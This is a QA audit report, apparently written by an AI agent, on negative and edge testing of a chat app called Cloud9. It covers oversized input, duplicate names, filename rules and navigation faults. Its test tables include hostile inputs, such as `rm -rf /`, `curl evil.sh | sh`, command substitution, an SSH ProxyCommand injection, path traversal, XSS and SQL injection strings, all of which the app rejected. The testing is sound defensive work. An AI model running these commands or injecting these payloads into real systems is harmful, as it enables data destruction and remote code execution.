# Phase 5 — Negative & Edge Testing

**What this is:** the first time anybody has tried to BREAK Cloud9 rather than
use it correctly. Every earlier suite proves the app works when it is driven the
way it expects. This one submits every form empty, with garbage, with far too
much, and with characters designed to trip a program up.

**AUDIT ONLY.** Nothing here was fixed and nothing was committed. This file is a
findings list.

- Written: 2026-07-30
- Driven against: the throwaway QA stack (hub on `:8811`, screen on `:4188`,
  brand-new database, deleted afterwards). Never Vikas's real Cloud9.
- Build under test: `dist` artifacts of 2026-07-30 11:44, which are NEWER than
  the newest source edit at the time (11:16), so the build included the other
  agent's in-flight Projects/GitHub work.
- Ports: deliberately non-default (8811/4188) because a preview server was
  already holding 4173. Nothing in this file comes from a contended run.

**Tags.** `CONFIRMED` = reproduced with evidence in this run.
`AUTOMATION-SUSPECT` = might be the robot, not the app; a human re-check step is
given.

---

## Segment A — the message composer

Ran: 15 attacks. Console errors during the whole segment: **0**. Uncaught page
errors: **0**. No crash, no double-post.

### A-findings

| # | Attack | Expected | Actual | Severity | Tag |
|---|---|---|---|---|---|
| A3 | Type 100,000 characters into the composer and press Enter | Refused with a plain-words limit **and the typing is kept** so he can cut it down | Refused correctly and in plain words — the toast says *"that message is too long (max 40000 characters)"* — **but the composer was emptied first, so all 100,000 characters are gone.** He cannot shorten what he wrote; he has to write it again. | **Major** | CONFIRMED |
| A10 | Send a message that is only an opening code fence ` ``` ` | Show something — never a blank bubble | A message row is posted whose body renders **completely empty**: the bubble shows only the timestamp and the hover actions. Reproduced text of the row: `12:11 ☺ ↳ Reply ↩ ⧉ ✎ 🗑` — no body at all. | Minor | CONFIRMED |
| A8 | Send text containing NUL (U+0000), BEL (U+0007) and vertical tab (U+000B) | Either refused in plain words, or stored and shown safely | Accepted silently and stored with the control characters intact; they come back down and sit in the DOM. Nothing visibly breaks today, but a NUL byte in a SQLite text column and in FTS5 index input is a latent trap. No user-visible error (correctly — nothing failed). | Minor | CONFIRMED |
| A11 | Send `safe‮gnp.exe …` — a Right-to-Left Override that flips the rest of the line | Strip the override, or confine it | The override survives into the DOM and does flip the text after it (`gnp.exe` renders as `exe.png`). It is confined to its own bubble — the rest of the app is not flipped — so this is a text-spoofing nuisance, not a layout break. Matters more once friends can post (Tailscale) than it does today with only him. | Minor | CONFIRMED |

### A-passes (attacked, held up)

| # | Attack | Result |
|---|---|---|
| A1 | Enter on an empty composer | Send button is disabled; nothing posted |
| A2 | Composer holding only spaces, tabs and newlines | Send stays disabled; nothing posted |
| A4 | Emoji: family ZWJ sequence, flag, skin-tone modifier | Posts and renders as the same glyphs |
| A5 | Right-to-left Arabic | Posts and renders; row not broken |
| A6 | `<script>alert(1)</script>` plus `<img src=x onerror=…>` | **Rendered as literal text.** Zero `<script>` and zero `<img>` elements entered the page; `document.title` unchanged. No XSS. |
| A7 | Quotes, backslashes, backticks, `${…}`, `%s`, `{{curly}}` | Comes back exactly as typed |
| A9 | Badly nested markdown `**a *b `c` d* e**` plus unclosed marks | Posts, renders, no raw HTML leak, no blank bubble |
| A10b | Unterminated ` ```js ` block | Code stays visible and is labelled `JS` |
| A12 | Double-click Send | Exactly one message posted |
| A13 | Enter mashed eight times with one message typed | Exactly one message posted; the seven empty presses do nothing |
| A14 | `@nobody-by-that-name` — calling an agent that does not exist | Posts, no crash |

Evidence screenshots: `docs/qa/p5-A3-100k.png`, `p5-A5-rtl.png`,
`p5-A6-script.png`, `p5-A9-markdown.png`, `p5-A11-bidi.png` (in the scratchpad
run folder; copied here where useful).

---

## Segment B — creating and editing an agent

Ran: 13 attacks. Console errors: **0**. Uncaught page errors: **0**.

> **A harness fault is recorded here on purpose.** The first run of B3/B5/B6/B9
> counted the crew with `.sidebar .agentrow`, which matches nothing on this
> build. It reported "no agent was created" for every one of them. That was the
> robot looking in the wrong place, **not** the app failing, and those four
> results were thrown away rather than written up. They were re-run against
> `.cast[data-crew]` on the Crew screen, with a control check first (B0) proving
> that selector really can see agents that exist. Absent-because-broken and
> absent-because-I-looked-wrong are not the same finding.

### B-findings

| # | Attack | Expected | Actual | Severity | Tag |
|---|---|---|---|---|---|
| B6 | Create a second agent also named `Scout`, then a third and a fourth | Refused in plain words, or made distinguishable | **Accepted silently, every time.** Four agents named `Scout` now sit in the crew. No warning, no toast, no hint. | **Major** | CONFIRMED |
| B6b | With four agents named `Scout`, type `@Sco` in the composer | He can tell them apart before he picks one | The picker offers four rows reading **exactly** `✨ Scout AGENT`, `✨ Scout AGENT`, `✨ Scout AGENT`, `✨ Scout AGENT`. There is no way to know which agent he is about to hand work to — different personalities, different apps, different reach, one name. This is what makes B6 a Major rather than a Minor. | **Major** | CONFIRMED |
| B9 | Name an agent `<script>document.title="AGENTPWN"</script>` | Literal text, no script element, title unchanged | **No XSS** — the name is escaped, zero script elements, `document.title` stayed `Cloud9`. But the agent is created and now appears in the crew and in the `@` picker with that as its name. Nothing refuses obviously-not-a-name text. | Minor | CONFIRMED |
| B3 | Name an agent `🐙🐙🐙` and nothing else | Accepted and reachable, or refused in plain words | Accepted silently and **is** reachable — the `@` picker offers `✨ 🐙🐙🐙 AGENT`. Works. Recorded only because it is accepted with no comment either way. | Minor (works) | CONFIRMED |
| B8b | Turn every ability OFF and Save | Saves, and the screen says plainly what this agent can no longer do | Saves with **nothing said**. An agent that can now do nothing at all looks identical to one that can do everything. | Minor | CONFIRMED |

### B-passes (attacked, held up)

| # | Attack | Result |
|---|---|---|
| B1 | Create agent with the name empty | `Create agent` button is **disabled**. Nothing created. |
| B2 | Name of eight spaces and nothing else | `Create agent` stays **disabled**. Nothing created. |
| B4 | A 5,000-character agent name | Refused with the plain sentence *"that name is too long (max 64 characters)"* — **and the field kept all 5,000 characters**, so he can cut it down. This is exactly the behaviour the composer (A3) gets wrong. |
| B7 | A 200,000-character personality / system prompt | Refused with *"that personality is too long (max 8000 characters)"*, in 4.2s, **and the typing was kept**. No freeze. |
| B5 | (control) create a normal agent | Appears in the crew immediately |
| B3b | `@` the emoji-named agent | Offered in the picker; reachable |

### B — not concluded

| # | Attack | Why it is not a finding | Human re-check |
|---|---|---|---|
| B8a | Every ability toggled ON at once, then Save | The walk reported **7 of 8** checked after clicking all eight, then saved with no error. A later read of the same panel (B8c) shows **no ability is disabled**, so the eighth was most likely a click the robot lost, not a control that refuses. Not written up as a bug. | Open Crew → Edit an agent → open the ability list → tick all eight by hand → Save. Re-open. Are all eight still on? |

---

## Segment C — connecting a repository (Projects screen)

Ran: 17 attacks. Console errors: **0**. Uncaught page errors: **0**.
Control (C0) first: a well-formed `vikas53953/cloud9` **does** connect through
this walk, so a later "it refused" is the app refusing, not the robot failing to
work the form.

**This is the best-defended form in the app.** Fourteen of the fifteen malformed
names were refused with a plain sentence printed *in the form, where he is
looking* — not a toast he might miss, not silence.

### C-findings

| # | Attack | Expected | Actual | Severity | Tag |
|---|---|---|---|---|---|
| C12 | Connect `definitely-not-a-real-owner-xyz987/nope` — an owner that does not exist | Some sign that GitHub has never heard of it | **Accepted with no complaint.** The form closes, the repository joins the list, and it sits there forever saying *"Not looked at GitHub yet"* — which is the same thing a correctly-typed repository says. He cannot tell a typo from a real repository he simply hasn't synced. This is the visible face of the known gap in HANDOFF §5 (nothing ever sends `projectSynced`), but it is worth its own row because **the user-facing symptom is that a mistyped repository is indistinguishable from a good one, permanently.** | **Major** | CONFIRMED |
| C1 / C2 | Empty box, and a box holding only spaces | — | Refused correctly (*"say which repository, as owner/name — for example vikas53953/cloud9"*), but the `Connect` button is **not** disabled beforehand, so he must press it to learn the box is empty. Cosmetic next to B1, where the equivalent button *is* disabled — the two forms disagree with each other. | Minor | CONFIRMED |

### C-passes (attacked, held up)

Every one of these printed a plain sentence **inside the form** and connected nothing:

| # | Input | The sentence he sees |
|---|---|---|
| C3 | `not a repository at all` | *that isn't a repository name — use owner/name, like vikas53953/cloud9* |
| C4 | `../../etc/passwd` | *that isn't a repository name* |
| C5 | `owner/name; rm -rf /` | *that isn't a repository name — use owner/name, …* |
| C6 | `owner/na,me` (the comma) | *that isn't a repository name — use owner/name, …* — **this answers the brief's question: the user sees a normal, plain-words refusal in the form. The comma guard never surfaces as a raw or technical error.** |
| C7 | `owner/name && curl evil.sh \| sh` | *that isn't a repository name — use owner/name, …* |
| C8 | `$(whoami)/repo` | *that isn't a repository name — use owner/name, …* |
| C9 | `-oProxyCommand=touch/pwned` | *that isn't a repository name — use owner/name, …* |
| C10 | a full `https://github.com/…` URL | *that isn't a repository name — use owner/name, …* |
| C11 | a 400-character name | *that isn't a repository name — use owner/name, …* |
| C13 | `<script>alert(1)</script>/x` | *that isn't a repository name — use owner/name, …* |
| C14 | `🐙/🐙` | *that isn't a repository name — use owner/name, …* |
| C15 | the same repository connected **twice** | Quietly reuses the existing row. **One** row, not two. Correct. |
| C16 | what a connected repository says while nothing syncs it | *"Not looked at GitHub yet"* — honest, not a fake empty list |

> C13 and C14 were first auto-tagged as "accepted" by the run. That tag was
> wrong: the walk compared list lengths, and C12 had already added a row. Read
> against the sentence the form actually printed, both were cleanly refused.
> Corrected here rather than shipped as two false Majors.

---

## Segment D — channels and rooms

Ran: 14 attacks across two passes. Console errors: **0**. Uncaught page errors: **0**.
Controls first in both passes: D0 proved a normal channel can be created through
this walk; D-CTRL proved the room details panel opens and its controls can be
listed, so "no such control" below means the app, not the robot.

> **Second harness fault recorded.** The first pass opened the room panel by
> clicking `.chathead .ch-title`, which is a heading, not a button. It found no
> Archive control and no Leave control and would have reported both as missing.
> The app's own opener is `.chathead .roomdetailsbtn`. Re-run with it, **every
> one of those controls is present and works.** Nothing from the bad pass was
> written up.

### D-findings

| # | Attack | Expected | Actual | Severity | Tag |
|---|---|---|---|---|---|
| D2 | Create a channel named with six spaces and nothing else | Refused; no blank-named channel | The name box silently rewrites whitespace to hyphens, so six spaces became the single character `-`. `Create` was **enabled**, and a channel literally named **`-`** now exists in his sidebar. He typed nothing and got a room. | **Major** | CONFIRMED |
| D3 | Create a second channel also called `goa-trip` | Refused, or reuses the existing one | **Accepted silently.** Two rows in the sidebar both reading `# goa-trip`, no warning. Same class of hole as B6 (duplicate agents) — the app has no uniqueness rule for names anywhere. | **Major** | CONFIRMED |
| D4 | A channel name of 3,000 characters | Refused in plain words | **Accepted in full.** A 3,000-character channel name is now in the sidebar. Nothing was said. Compare with the agent name (B4), which is capped at 64 characters with a plain sentence — the two forms disagree. | **Major** | CONFIRMED |
| D5 | Channel named `<script>alert(1)</script>` | Escaped or refused | **No XSS** — escaped as text, `document.title` unchanged. But it is accepted and now sits in his sidebar as a channel name. | Minor | CONFIRMED |
| D6 | Channel named only with emoji `🎉🎉` | Accepted and readable, or refused | Accepted, readable. Works. Recorded only for completeness. | Minor (works) | CONFIRMED |

The through-line: **the channel name box has no length rule, no uniqueness rule
and no "is this actually a name" rule**, while the agent name box next door has
all three. That is one fix at the class level, not four fixes.

### D-passes (attacked, held up)

| # | Attack | Result |
|---|---|---|
| D1 | New channel with the name empty | `Create` is **disabled**. Nothing created. |
| D7 | Archive a room, then look for any way to post in it | **Clean.** Zero composer textareas remain; the box is replaced by *"that conversation is archived — nothing new can be said in it"*. |
| D7b | Read an archived room | Everything posted before the archive is still there |
| D9b | Press `Leave this room` on `#general` as the owner | A confirm step appears before anything happens |
| D8 | Browse rooms when he is already in all of them | Nothing false is offered. The empty case is a sentence: *"No open rooms to join. Rooms are private unless someone opens them."* |

### D — not concluded

| # | Attack | Why | Human re-check |
|---|---|---|---|
| D7c | Reopen an archived room | The walk clicked `.chathead .roomdetailsbtn` again, which **toggles the already-open panel shut**, so it then reported "no Reopen control". That is the robot closing its own panel. The existing browser suite already covers reopening and passes it. **Not a finding.** | Archive a room, then press `Reopen` in the panel that is already open. Does the composer come back? |
| D9 | Actually leaving `#general` and being stranded | The confirm step was reached but deliberately **not** confirmed — confirming would have stranded the QA owner out of the only room and killed the rest of the run. | Leave `#general` by hand in a throwaway stack. Can he get back in? |
| D8b | Joining the same room twice | Needs a second person with a room open to them. This stack has one user. **Never tested.** | Invite a friend, open a room, join it twice from their side. |

---

## Segment E — search

Ran: 19 attacks. Console errors: **0**. Uncaught page errors: **0**.
Control (E0) first: a real word returns a real hit through this walk.

**This is the strongest surface in the app.** SQLite FTS5 sits behind it, which
is exactly the kind of thing that leaks a raw `fts5: syntax error near "*"` at a
user. **It never did, once.** Every hostile query came back with a plain English
sentence.

### E-findings

**None at Blocker or Major.** One Minor, and it is arguably correct behaviour:

| # | Attack | Expected | Actual | Severity | Tag |
|---|---|---|---|---|---|
| E8 | `backlog OR villa` — a real FTS5 `OR` between two words that both exist | Either both sets of results, or a plain miss | Returns nothing, and says *"Nothing you can see says 'backlog OR villa'."* The operator is neutralised and treated as a literal word — which is the safe choice and matches the panel's own help (*"It matches whole words in any order"*). Recorded only because somebody who knows search syntax will type it and get a confusing zero. | Minor | CONFIRMED |

### E-passes (attacked, held up)

| # | Query | What he sees |
|---|---|---|
| E1 / E2 | empty box, and only spaces | *"Type at least two letters. `in:general` looks in one channel and `from:Priya` looks for one person."* — a help sentence, not a void |
| E3 | a single `"` (unbalanced FTS5 string) | The same help sentence. **No database error.** |
| E4 | `"unclosed phrase` | *"Nothing you can see says …"* — plain miss, no syntax error |
| E5 | a bare `*` | Help sentence; no error |
| E6 / E7 | bare `NEAR`, bare `OR` | Plain miss in words |
| E9 | `NEAR(backlog villa, 3)` — a full FTS5 expression | Plain miss. **No syntax error.** |
| E10 | `^*` — invalid even for FTS5 | Plain miss |
| E11 | `!@#$%^&*()[]{}<>?/\|~\`` — nothing but punctuation | Plain miss |
| E12 | `zzzzqqqq123-definitely-absent` | Proper empty state — **search is live, not static** |
| E13 | `backlog*` | Finds the real message. Prefix search works. |
| E14 | `'; DROP TABLE messages; --` | Plain miss. Nothing dropped; the app kept working for every check after it. **No SQL injection.** |
| E15 | `<script>alert(1)</script>` as the query | Finds the earlier message containing it and shows it as text |
| E17 | a **10,000-character** query | Answered in 6.1s with a correct hit. No freeze, no crash, no error. |
| E18 | search a message that itself contains `<b>` and `<img onerror=…>`, then read the highlighted snippet | **Correctly escaped.** Snippet HTML is `<mark>marker</mark> &lt;b&gt;bolded&lt;/b&gt; &lt;img src=x onerror=alert(1)&gt; <mark>marker</mark>` — zero `<img>` elements, zero stray `<b>`. Only the highlighter's own `<mark>` is real. This is the one place an app usually gets XSS wrong, and it is right. |

### E — not concluded

| # | Attack | Why | Human re-check |
|---|---|---|---|
| E16 | Searching for an emoji (`🐙`) | Returned nothing, but **no message in this database contained that emoji**, so a miss proves nothing either way. | Post `🐙` in a room, then search `🐙`. Does it find it? |

---

## Segment F — files and attachments

Ran: 20 attacks across two passes. Console errors: **0**. Uncaught page errors: **0**.
Control (F0) first: an ordinary 5-byte text file lands in the tray as
*"5 bytes · ready to send"*, so a later refusal is the app refusing.

### F-findings

| # | Attack | Expected | Actual | Severity | Tag |
|---|---|---|---|---|---|
| F3 / F3b | Attach files with everyday names | A name a normal person has on their desktop is accepted | The filename guard is **far stricter than the sentence it prints**. It says *"use plain letters, numbers, dots and dashes"* and refuses everything else. Measured, name by name: **accepted** — `site plan.pdf`, `Site Plan Final.pdf`, `invoice_2026-07.pdf` (spaces and underscores are fine, despite the sentence not mentioning them). **Refused** — `report(1).pdf`, `budget,notes.txt`, `café-menu.txt`, `photo#3.png`, `notes'quote.txt`, `मेरी फ़ाइल.txt`. `report(1).pdf` is the exact name every browser gives a re-downloaded file, and `café` is an ordinary word. He will hit this on a real file, and the message tells him to remove characters it actually permits. | **Major** | CONFIRMED |

That is one finding with two halves: **the rule is too tight for real filenames**,
and **the sentence does not describe the rule it enforces** (it omits spaces and
underscores, which are allowed).

### F-passes (attacked, held up)

| # | Attack | What he sees |
|---|---|---|
| F1 | A **0-byte** file | Refused in the tray: *"that file is empty"*. No stuck spinner. |
| F2 | A file with **no extension** (`README`) | Accepted — *"17 bytes · ready to send"* |
| F4 | A filename that is a **path traversal** (`..\..\..\windows\system32\evil.txt`) | Refused by the same name guard. Nothing traversed. |
| F5 | A filename carrying a **script tag** | Refused, and the name is escaped where it is shown. `document.title` unchanged. **No XSS.** |
| F6 | A **10.5 MB** file, just over the 10 MB ceiling | Refused in the tray, naming the limit: *"that file is too big (max 10 MB)"*. Took 18s to reject — slow, but it does say so. |
| F7 / F7b | **Eleven** files at once when ten is the maximum | Tray holds exactly 10, and the toast says *"that's the most files one message can carry (10)"*. (The first pass missed the toast because it read too late — the toast **is** shown; corrected here.) |
| F8 | A message that is a **file and no words** | Allowed; the button reads *"Send with 1 file"*. The file is the message. |
| F9 | **Double-click Send** with a file attached | Exactly one message. No duplicate upload. |

### F — not concluded

| # | Attack | Why | Human re-check |
|---|---|---|---|
| F10 | A genuinely huge file (hundreds of MB / GB) | Only 10.5 MB was tried, because the ceiling is 10 MB and anything larger tests the same code path. Whether the **browser or the app** stalls while reading a 2 GB file off disk before the guard ever runs is **untested**. | Attach a 2 GB file. Does the window stay responsive while it is read? |
| F11 | A file whose contents lie about its type (a `.png` that is really an `.exe`) | **Never tested.** | Rename an `.exe` to `.png` and attach it. |

---

## Segment G — interaction abuse

Ran: 8 attacks across two passes. Uncaught page errors in the clean pass: **0**.
Console errors: **0**. Control (G-CTRL) first: the walk was proven to be on the
Cloud9 workspace, with its sidebar and all seven rail buttons, before anything
was abused.

> **Third harness fault recorded.** The first pass double-clicked every primary
> button on the chat screen — and one of them was a file **`Save`**, which is a
> download link. The tab left Cloud9 for `/attachment/tk_…` and every check
> after it was measuring a page that was **not the app**. It would have reported
> "reload signs him out", "the composer disappears at 900px" and "the rail dies
> at 380px" — three Blockers that do not exist. All four checks were re-run on a
> clean tab. **Nothing from that pass is reported.** A second re-run was also
> thrown away because the QA hub was killed mid-run and the screen could not
> reach it; results from a stack that is not up are not results.

### G-findings

| # | Attack | Expected | Actual | Severity | Tag |
|---|---|---|---|---|---|
| G3 | Walk five screens, then press browser **Back** three times | He lands on a working Cloud9 screen | **The first Back leaves the app entirely** — `about:blank`, three times running, no sidebar and no rail. Forward brings it all back intact. Root cause is visible in the same evidence: **the URL never changes as he moves between Chat, Crew, Tasks, Projects and Activity** — it stays `/?relay=…` throughout. There is no routing, so the browser has no in-app history to step back through and Back exits on the first press. In the packaged Electron window there is no Back button, which is why this has never bitten him; it would bite immediately in any browser or web build, and it is the reason a deep link to a screen is impossible. | Minor *(today)* / Major *(the moment there is a web build)* | CONFIRMED |

### G-passes (attacked, held up)

| # | Attack | Result |
|---|---|---|
| G1 | Double-click **every** icon-rail button, twice around all seven | All seven survive; zero uncaught errors |
| G2 | Double-click the primary buttons on the chat screen | Zero uncaught errors, nothing duplicated |
| G4 | **Reload** mid-session from the Crew screen | Comes straight back into the workspace, still signed in |
| G5 | Squeeze the window to **900 / 600 / 375 / 320px** with a half-typed message in the composer | **Clean at every width.** The composer stays present, **the half-typed message survives all four resizes**, the rail keeps all seven buttons, and the page **never scrolls sideways** — not even at 320px |
| G6 | Switch screens five times in under a second at **380px** wide | No crash; rail and workspace intact |
| — | Uncaught page errors across the entire abuse re-run | **0** |

---

## Summary

**0 Blockers · 7 Majors · 11 Minors.** Across roughly 90 hostile inputs there
was **not one crash, not one uncaught page error, and not one raw database or
stack-trace error shown to the user.**

### The three worst, in the order they would hurt him

1. **A3 — the composer throws away what he typed when it refuses it.** Type a
   long message, press Enter, and the box is emptied *before* the hub answers
   "that message is too long (max 40000 characters)". The words are gone. He
   cannot shorten them; he has to write them again. The agent name box two
   screens away gets this exactly right — it keeps the text — so the app already
   knows how, in one place and not the other.
2. **B6 / B6b — he cannot tell his agents apart.** Nothing stops four agents
   being named `Scout`, and the `@` picker then offers four rows reading exactly
   `✨ Scout AGENT`. Different personalities, different apps, different reach —
   one name. He will hand real work to the wrong agent and have no way to know.
3. **F3 — ordinary files are refused, and the reason given is wrong.**
   `report(1).pdf` — the name every browser gives a re-downloaded file — is
   refused, along with `café-menu.txt`, `budget,notes.txt` and `photo#3.png`.
   The message says *"use plain letters, numbers, dots and dashes"*, which does
   not mention the spaces and underscores it actually permits, so it points him
   at the wrong thing to fix.

### The pattern behind the Majors

Five of the seven Majors are the same missing rule in different places: **no
form agrees with any other about names.** Agent names are capped at 64
characters with a plain sentence and the typing kept (right). Channel names have
**no** length cap, **no** uniqueness rule, and silently rewrite whitespace into a
channel called `-` (wrong). Repository names are validated hard and refused in
the form (right). Messages are capped but throw the text away (half right).
Filenames are capped by a rule stricter than the sentence describing it (wrong).
This is one class fix — one owner for "check what a person typed and say so
without losing it" — not seven patches.

### What held up

Worth saying plainly, because it is most of the app: **XSS is not possible
anywhere it was tried.** `<script>` and `onerror` payloads were escaped in
messages, in agent names, in channel names, in filenames and — the usual weak
spot — inside search-result snippets, where the highlighter correctly emits
`&lt;img …&gt;` and only its own `<mark>` is real. SQL injection through search
did nothing. FTS5 operators never once leaked a syntax error. The 10 MB and
ten-file attachment ceilings, the 0-byte guard, the archived-room lock and the
`Leave this room` confirm step are all correct and all speak plain English.
Double-clicking Send never posted twice — not with text, not with a file
attached — and Enter mashed eight times posted exactly one message. At 320px the
layout does not break and does not lose his typing.

---

## NOT TESTED — an omission left unlisted is a claim that it passed

Everything below was **never exercised**. None of it may be read as passing.

**Whole surfaces never attacked**

- **The INSTALLED Windows app.** Everything here ran against the browser build
  on the throwaway stack. `npm run qa:app` (CDP to `Cloud9.exe`) was **not** run
  in this phase — the installed app's own window, menus, Electron file dialogs
  and native download path are untested against hostile input.
- **The Tasks / jobs screen** — delegating a job with an empty brief, a 200k
  brief, garbage, or double-clicking Approve/Reject. Not touched at all.
- **The Settings screen** — sign-in fields, the owner key box, the invite-code
  box with garbage or an expired code.
- **The marketplace / casting room** — hiring the same role twice, hiring while
  offline.
- **Skills** — the skill editor, and uploading a hostile skill file.
- **The permission / approval card** — approving twice, approving an expired
  request, rejecting after approving.
- **Quick chat (Ctrl-K)** with garbage input.
- **Threads and reactions** — an empty thread reply, a non-emoji reaction, the
  same reaction spammed.
- **Editing and deleting messages** — editing to empty, editing to 100k,
  deleting twice.

**Named in the brief but not reached**

- **Joining a room twice** and **leaving a room you are not in** — both need a
  second person, and this stack has one user (D8b).
- **Actually leaving `#general`** — the confirm step was reached but deliberately
  not confirmed; confirming would have stranded the QA owner and killed the run (D9).

**Attacks deliberately not attempted**

- **Killing the network mid-action / offline mode** — §5 asks for it. Not done:
  the hub is loopback-only and pulling it down mid-run would have destroyed the
  remaining segments, which had already been lost three times to platform
  overloads and once to the hub being killed.
- **A genuinely huge file** (hundreds of MB or GB) — only 10.5 MB was tried (F10).
- **A file whose contents lie about its type** — an `.exe` renamed `.png` (F11).
- **Two views of the same item, act in one and check the other** — §5 asks for
  it; needs two windows and was not set up.
- **Reopening an archived room** — the walk toggled its own panel shut; the
  existing suite covers it (D7c).
- **Searching for an emoji** — no message in the database contained one, so the
  miss proves nothing (E16).
- **Whether all eight abilities stay on after a save** — one toggle was probably
  a lost click, not a refusing control (B8a).

**Conditions this ran under**

- Browser build only, throwaway stack, ports 8811/4188, fresh database.
- Another agent was editing `packages/**`, `apps/relay/**` and
  `apps/desktop/src/**` throughout. The build under test (11:44) was newer than
  the newest source edit at the time (11:16), and the working tree was clean, so
  the results reflect a coherent build — but **any of it may be invalidated by
  edits landing after 11:16.**
- No result in this file comes from a run that was fighting for a port. Two runs
  were discarded outright: one where the harness had navigated off the app, one
  where the hub had been killed.
- The driver scripts that produced every result above are kept at
  `%TEMP%\claude\…\scratchpad\p5*.mjs` (`p5.mjs` plus one file per segment), with
  raw JSON results in `p5-<segment>.json` and screenshots as `p5-*.png`.
